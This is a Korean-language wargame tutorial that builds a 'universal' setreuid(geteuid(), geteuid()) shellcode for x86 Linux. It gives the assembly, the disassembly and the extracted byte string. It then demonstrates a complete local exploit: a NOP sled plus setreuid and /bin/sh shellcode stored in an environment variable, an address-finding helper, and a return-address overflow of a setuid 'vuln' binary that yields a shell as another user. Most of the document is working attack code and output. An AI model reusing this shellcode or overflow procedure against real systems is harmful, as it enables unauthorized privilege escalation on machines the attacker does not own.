// ========================================
//
// Subject - universal setreuid() shellcode
//
// ========================================

/*
	hkpco
	hkpco@korea.com
	http://hkpco.kr/
*/


일반적으로 대회나 워게임 등을 할 때에는 목표 권한의 uid, gid에 맞는 setreuid() 기계어 코드를 만듭니다.

하지만 매번 새로운 코드를 만드는것은 매우 번거로운 작업입니다.

여기에 대해 여러가지 상황에서 굳이 uid를 신경쓰지 않고도 setreuid() 코드를 적용시킬 수 있는 방법을 소개하고자 합니다.

geteuid() 시스템 콜을 이용하는 방법으로, 해당 시스템 콜은 현재 동작하는 프로그램의 uid를 리턴해 줍니다.

즉, setreuid( geteuid() , geteuid() );를 수행하는 기계어 코드를 제작하면 geteuid() 시스템 콜이 리턴해 주는

대상 프로그램의 권한이 setreuid()에 바로 적용되기 때문에 상황에 따른 능동적인 코드가 되게 됩니다.

그럼 실제 기계어 코드를 제작해 보겠습니다.

========================================================================
[hkpco@ns hack]$ cat /usr/include/asm/unistd.h | grep geteuid
#define __NR_geteuid             49
[hkpco@ns hack]$ cat /usr/include/asm/unistd.h | grep setreuid
#define __NR_setreuid            70

[hkpco@ns hack]$ cat setreuid_univ.s
.section .text
.globl _start
_start:

xor %eax, %eax
movb $49, %al
int $0x80
## geteuid() system call

mov %eax, %ebx
mov %eax, %ecx
xor %eax, %eax
movb $70, %al
int $0x80
## setreuid() system call
========================================================================


위 어셈블리 코드는 geteuid() 시스템 콜 호출 시의 리턴값을 setreuid()의 인자로 넘겨주고 호출하는 역할을 합니다.

이제 컴파일 한 뒤 기계어 코드를 추출해 보겠습니다.

========================================================================
[hkpco@ns hack]$ as setreuid_univ.s -o setreuid_univ.o
[hkpco@ns hack]$ ld setreuid_univ.o -o setreuid_univ

[hkpco@ns hack]$ objdump -d setreuid_univ

setreuid_univ:     file format elf32-i386

Disassembly of section .text:

08048074 <_start>:
 8048074:       31 c0                   xor    %eax,%eax
 8048076:       b0 31                   mov    $0x31,%al
 8048078:       cd 80                   int    $0x80
 804807a:       89 c3                   mov    %eax,%ebx
 804807c:       89 c1                   mov    %eax,%ecx
 804807e:       31 c0                   xor    %eax,%eax
 8048080:       b0 46                   mov    $0x46,%al
 8048082:       cd 80                   int    $0x80
========================================================================


이렇게 해서 얻은 코드는 아래와 같습니다.

-> \x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80


실제로 정상 작동하는지 테스트 해 보겠습니다.

========================================================================
[hkpco@ns univ]$ id
uid=511(hkpco) gid=513(hkpco) groups=513(hkpco)

[hkpco@ns univ]$ ls -al
total 152
drwxrwxr-x    2 hkpco    hkpco        4096 Jan 21 02:20 .
drwxrwxrwt   37 root     root       131072 Jan 21 02:20 ..
-rwsr-sr-x    1 test     test        11541 Jan 21 02:19 vuln
-rw-r--r--    1 test     test           82 Jan 21 02:19 vuln.c

[hkpco@ns univ]$ export HK=`perl -e 'print "\x90"x512,
"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80", // setreuid( geteuid() , geteuid() );
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'` // shellcode

[hkpco@ns univ]$ cat get_addr.c
int main( void )
{
        char *p = getenv("HK");

        printf( "%p\n" , p );
}
[hkpco@ns univ]$ ./get_addr
0xbffffe89

[hkpco@ns univ]$ ./vuln `perl -e 'print "\x89\xfe\xff\xbf"x100'`
sh-2.05b$ id
uid=524(test) gid=513(hkpco) groups=513(hkpco)
========================================================================


성공적으로 권한을 획득한것을 볼 수 있습니다.
